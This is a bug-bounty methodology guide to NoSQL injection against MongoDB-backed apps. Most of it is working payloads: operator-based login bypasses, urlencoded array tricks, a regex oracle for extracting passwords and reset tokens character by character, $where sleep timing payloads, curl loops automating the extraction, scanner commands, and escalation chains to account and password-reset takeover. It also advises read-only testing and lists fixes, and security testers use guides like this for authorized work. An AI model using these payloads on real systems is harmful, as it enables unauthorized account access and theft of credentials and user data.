# NoSQL Injection

> One-line summary: Passing raw JSON/urlencoded input into MongoDB (or similar) lets you inject query operators like `$ne`/`$gt`/`$regex` — bypassing auth, guessing data character-by-character, and sometimes running JavaScript server-side — and it pays because scanners miss it and single-parameter auth bypass is critical.

## Overview

NoSQL injection happens when user input is placed into a NoSQL query without type/operator validation. In MongoDB-backed apps this usually means a login like `db.users.find({username: req.body.username, password: req.body.password})` where the attacker controls the *object*, not just the string — `{"password": {"$ne": "x"}}` makes the query match any password. It also arises via string interpolation into `$where`/`mapReduce` JavaScript, and via urlencoded array syntax (`password[$ne]=x`) that PHP/Express parsers convert into objects. Impact ranges from authentication bypass (critical) to full collection extraction (blind regex oracles) to server-side JS execution on old/unsafe deployments. It's a top bug-bounty find because JSON APIs are everywhere and almost no WAF or scanner tests operator injection.

## Where to find it

- Login/registration/password-reset endpoints of Node/Express, NestJS, Meteor, LoopBack apps (MongoDB behind them)
- Any JSON API where a field is echoed into a query: `{"email": "...", "token": "..."}`, coupon codes, invite codes
- Search/filter endpoints: `?search=`, `?username=`, `?filter[email]=`, `?where=`
- GraphQL resolvers with Mongo filters passed through (argument objects become query operators)
- URL-encoded forms hitting PHP/Laravel/Sails backends — `param[$ne]=` array syntax
- Cookies/JWT claims used directly in `find()` queries
- Admin panels with "export users" style filters
- Elasticsearch/CouchDB/Cassandra-backed endpoints occasionally accept operator-like syntax (`$regex` in ES query_string, CQL injection) — same methodology, different grammar

## Methodology

1. **Find candidates** — endpoints backed by MongoDB. Hints: `_id` in responses, 24-hex ObjectId strings, `{"$oid": ...}` extended JSON, `E11000 duplicate key` errors, `MongoError` in stack traces, `mongodb` in package files from JS analysis.
2. **Establish a baseline** — capture a valid login/query response (200 + token) and an invalid one (401/403). You will compare every probe against these two shapes, not against error text alone.
3. **Test operator injection in JSON** — replace a string value with an object:
   - `{"username": "admin", "password": {"$ne": "x"}}` → login as admin with a wrong password.
   - `{"username": {"$gt": ""}, "password": {"$gt": ""}}` → matches the first user in the collection.
   - `{"username": {"$in": ["admin"]}, "password": {"$ne": "x"}}` → targeted bypass when you know the username.
4. **Test urlencoded array syntax** — when the body is form-encoded, PHP/Express turn `password[$ne]=x` into `{password: {$ne: "x"}}`. Try: `username=admin&password[$ne]=x`, `username[$gt]=&password[$gt]=`. Also try the same in query strings: `?username=admin&password[$ne]=x`.
5. **Distinguish error-based from blind** — if the response leaks query errors (`CastError`, `$ where is not allowed`), you get feedback for free. Otherwise build a boolean oracle.
6. **Boolean oracle via `$regex`** — `{"username": "admin", "password": {"$regex": "^a"}}`. A 200 means the first character is `a`. Walk the charset (`^a`, `^b`, ...), then the next position (`^aa`, `^ab`), until the full value (or enough of a token) is recovered. Use `$regex` anchoring and short prefixes; avoid greedy patterns like `.*a.*` (ReDoS risk and slow).
7. **Timing oracle** — if the app collapses all responses to one shape, test `$where` with a sleep: `{"$where": "sleep(5000) || true"}` (requires `$where` enabled and server-side JS; works on many Mongo deployments ≤4.x with `security.javascriptEnabled`). Run 3x and compare against a baseline — Mongo sleeps are consistent when real.
8. **Confirm without damage** — read-only queries only. Do not run heavy `$where` loops or unanchored regexes (they can pin the DB CPU — that's a DoS and out of scope). Do not attempt writes (`$set`, `update`) on live data.
9. **Prove impact** — extract your own test account's password field via the oracle, or show the login bypass issuing a valid session for an account whose password you don't know (your own second account is the cleanest proof).

## Payloads

```json
// Auth bypass — JSON body (Content-Type: application/json)
{"username": "admin", "password": {"$ne": "x"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": "x"}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
{"username": "admin", "password": {"$exists": true}}
```

```bash
# urlencoded array syntax (Express qs / PHP parse_str → object)
curl -s -X POST https://target.com/api/login \
  -d 'username=admin&password[$ne]=x'

curl -s -X POST https://target.com/api/login \
  -d 'username[$gt]=&password[$gt]='

# same in a query string
curl -s "https://target.com/api/user?username=admin&password%5B%24ne%5D=x"
```

```json
// Regex extraction oracle — walk the charset per position
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
// ... 200 = correct prefix. Then:
{"username": "admin", "password": {"$regex": "^aa"}}
{"username": "admin", "password": {"$regex": "^0x"}}     // hex-looking hashes
```

```json
// Token / field extraction on reset-token style endpoints
{"email": "victim@example.com", "token": {"$regex": "^[0-9a-f]"}}
{"reset_token": {"$ne": ""}}
```

```json
// Server-side JS via $where (timing oracle; older deployments / JS enabled)
{"$where": "sleep(5000) || true"}
{"username": "admin", "password": {"$where": "this.password.length > 0 && sleep(3000) || true"}}
{"$where": "function(){ if(this.username=='admin'){ sleep(5000); return true } return false }"}
```

```json
// $where boolean extraction (error or bool oracle)
{"$where": "this.username == 'admin' && this.password[0] == 'a'"}
{"$where": "this.username == 'admin' && /^a/.test(this.password)"}
```

```bash
# Aggregation-style operator injection (find → aggregate paths)
# If the app passes your object into $match, comparison operators still work:
POST /api/report {"status": {"$ne": "x"}, "owner": {"$gt": ""}}
```

## Bypasses & edge cases

- **Content-Type switching** — WAFs often only inspect JSON (or only inspect forms). Try the same payload as `application/x-www-form-urlencoded` with `[$ne]=` syntax, or vice versa; also `?password[$ne]=` in the query string.
- **String vs single-element array** — some parsers unwrap `{"password": ["$ne"]}` or accept `"password": "x", "password": {"$ne": "x"}` duplicates; test both key orders.
- **`$ne` blocked but `$gt` allowed** — filters frequently allowlist comparison operators and forget `$regex`, `$exists`, `$in`, `$not`, `$nin`, `$gte`. Cycle through all.
- **Type coercion** — `{"password": {"$ne": 0}}`, `{"$ne": []}`, `{"$ne": {}}` behave differently per schema; if `$ne: ""` fails because stored values aren't strings, try numbers/objects.
- **`$where` disabled** — MongoDB Atlas and 5.0+ default `security.javascriptEnabled=false`; `$where` then errors (`$where is not allowed in this context`). Fall back to `$regex` oracles (~1 char per request).
- **Regex anchors** — use `^prefix`; unanchored `//` matches anywhere and is slow (ReDoS). Escape regex metachars when guessing literal values (`\\.`, `\\+`).
- **ObjectId contexts** — if the field must be an ObjectId, operator objects may throw `CastError` (still useful: error-based oracle). Try `{"$ne": null}` and `{"$gt": "000000000000000000000000"}`.
- **Mongoose strict mode** — strict schemas drop unknown operators silently; the injection then shows as no behavior change. Test the same payload in nested fields (`profile.password`) where strictness differs.
- **Parameter pollution** — send the parameter twice, once string once object (`username=admin&username[$ne]=x`); parsers pick the first or last occurrence unpredictably.
- **Blind via response shape** — even without an oracle, count differences leak: `$regex` true → 200 with body; false → 200 with empty `[]`. Distinguish "empty result" from "denied".

## Tools

```bash
# nosqli — dedicated scanner (Charlie Belmer), GET/POST with operator fuzzing
go install github.com/Charlie-belmer/nosqli@latest   # or download release binary
nosqli scan -t "https://target.com/api/user?username=admin&password=x"
nosqli scan -t "https://target.com/api/login" -d "username=admin&password=x"   # POST form
nosqli scan -t "https://target.com/api/login" -j                  # JSON body mode
# flags: -r request.txt  (raw request), -p proxy, -v verbose, --insecure
```

```bash
# NoSQLMap — interactive, supports Mongo/Redis/CouchDB
git clone https://github.com/codingo/NoSQLMap
python2 NoSQLMap.py -u "https://target.com/login" --http-form
# then follow prompts: set POST, params (username,password), and use
# attack 1 (MongoDB auth bypass) / attack 2 (blind via $where)
```

```bash
# Manual oracle loop with curl + jq (regex extraction, 1 request per char)
for c in a b c d e f 0 1 2 3; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target.com/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}")
  echo "$c -> $code"
done
```

```bash
# Timing check (repeat 3x, compare to baseline)
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{time_total}\n' -X POST https://target.com/api/login \
    -H 'Content-Type: application/json' -d '{"$where": "sleep(5000) || true"}'
done
```

Burp Intruder is fine for the regex walk: mark the character in `{"$regex":"^§a§"}`, cluster-bomb with a charset wordlist, and grep responses for the 200/success signature.

## Escalation & chaining

- **Auth bypass → account takeover** — the classic chain: operator injection on login returns a session for admin; then use legitimate admin features. If MFA checks are separate, the bypass often skips them (session issued pre-MFA).
- **Blind extraction → credential reuse** — recover API keys/tokens stored in the same collection (`apiKey`, `resetToken` fields), then call privileged APIs directly.
- **NoSQLi → SSRF/RCE** — `$where` JS gives server-side JS execution: `{"$where": "const x = this; return true"}` proves execution; further use `process`/`require` is rarely available in modern Mongo, so treat RCE as version-dependent, but DoS/CPU pinning (don't do it on live targets) is the historical risk.
- **NoSQLi in aggregation → data crossing tenants** — if `$match` receives attacker JSON, `$lookup` can join collections the API never intended to expose.
- **Chain with IDOR** — use the boolean oracle to confirm existence of objects across tenant IDs, then fetch via the normal endpoint.
- **NoSQLi → password reset takeover** — regex oracle on reset tokens (6-digit or UUID-prefix) recovers a live token within the window, then reset the victim account.

## Report notes

- Raw request and response for the bypass: `{"username":"admin","password":{"$ne":"x"}}` → `200 {"token":"eyJ..."}` — show the token belongs to an admin context (decode it or show one privileged call succeeding, no data modification).
- For regex extraction: the list of requests (or a script/screenshot) showing `^a` → 200, `^b` → 401, and the final recovered prefix/value. State the number of requests it took and the charset.
- Timing evidence for `$where`/sleep: three runs with ms values plus a baseline run of the same endpoint with a valid login.
- Name the collection/field only if you legitimately know it (from your own data or errors) — do not imply access to collections you didn't touch.
- Impact: "unauthenticated login bypass on `POST /api/login` returns a valid admin session" / "blind extraction of any user's reset token via regex oracle on `POST /api/reset-check`".
- Fix: validate input types (reject non-string where a string is expected), use `$eq`-style explicit casting (`String(req.body.x)`), disable `$where`/server-side JS, allowlist operator names, schema validation (Joi/Mongoose strict) on every query path.

## References

- [HackTricks — NoSQL injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings — NoSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [Null Sweep — NoSQL Injection in Modern Web Applications](https://nullsweep.com/nosql-injection-in-modern-web-applications/)
- [OWASP WSTG — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [nosqli scanner](https://github.com/Charlie-belmer/nosqli)
- [MongoDB — security checklist (disable server-side JS)](https://www.mongodb.com/docs/manual/administration/security-checklist/)
